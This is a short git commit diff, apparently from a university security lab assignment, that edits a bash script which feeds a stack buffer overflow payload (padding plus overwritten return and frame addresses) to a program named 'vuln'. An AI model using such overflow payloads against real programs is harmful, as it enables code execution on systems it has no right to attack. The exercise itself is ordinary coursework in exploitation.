6dbb72e4f724522637e78a2e18fd7c1d3b462838
Harry <wigglespottery@yahoo.com>
2021-04-05 22:38:07 +0100

    task 2

--- task2.sh
+++ task2.sh
@@ -1,2 +1,2 @@
 #!/usr/bin/env bash
-/task2/s1803764/vuln "$(python -c "print('A'*1350 + '\x56\x85\x04\x08')")"
+/task2/s1803764/vuln "$(python -c "print('A'*1346 + '\x92\xd8\xff\xff' + '\x56\x85\x04\x08')")"
